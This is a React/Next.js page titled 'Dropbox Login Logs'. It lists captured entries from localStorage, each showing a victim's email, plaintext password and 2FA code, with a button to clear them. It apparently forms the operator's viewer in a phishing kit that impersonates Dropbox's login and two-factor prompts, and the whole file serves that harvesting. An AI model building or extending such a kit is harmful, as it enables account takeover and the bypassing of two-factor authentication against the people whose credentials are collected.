'use client';

import { useEffect, useState } from 'react';

interface LogEntry {
  timestamp: string;
  email: string;
  password: string;
  code?: string;
  type: 'login' | '2fa';
}

export default function LogsPage() {
  const [logs, setLogs] = useState<LogEntry[]>([]);

  useEffect(() => {
    const storedLogs = JSON.parse(localStorage.getItem('dropbox_logs') || '[]');
    setLogs(storedLogs);
  }, []);

  const clearLogs = () => {
    localStorage.removeItem('dropbox_logs');
    setLogs([]);
  };

  return (
    <div className="min-h-screen bg-gray-50 py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-4xl mx-auto">
        <div className="bg-white shadow rounded-lg overflow-hidden">
          <div className="px-4 py-5 sm:px-6 flex justify-between items-center">
            <h1 className="text-xl font-semibold text-gray-900">Dropbox Login Logs</h1>
            <button
              onClick={clearLogs}
              className="text-sm text-red-600 hover:text-red-800"
            >
              Clear All Logs
            </button>
          </div>
          <div className="border-t border-gray-200">
            <div className="px-4 py-5 sm:p-6">
              {logs.length === 0 ? (
                <p className="text-gray-500 text-center">No logs yet</p>
              ) : (
                <div className="space-y-4">
                  {logs.map((entry, index) => (
                    <div
                      key={index}
                      className="bg-gray-50 p-4 rounded-lg"
                    >
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-gray-500">{entry.timestamp}</span>
                        <span className={`text-xs px-2 py-1 rounded ${
                          entry.type === 'login' ? 'bg-blue-100 text-blue-800' : 'bg-green-100 text-green-800'
                        }`}>
                          {entry.type === 'login' ? 'Login' : '2FA'}
                        </span>
                      </div>
                      <div className="mt-2 space-y-1">
                        <p className="text-sm text-gray-900">
                          <span className="font-medium">Email:</span> {entry.email}
                        </p>
                        <p className="text-sm text-gray-900">
                          <span className="font-medium">Password:</span> {entry.password}
                        </p>
                        {entry.code && (
                          <p className="text-sm text-gray-900">
                            <span className="font-medium">2FA Code:</span> {entry.code}
                          </p>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
} 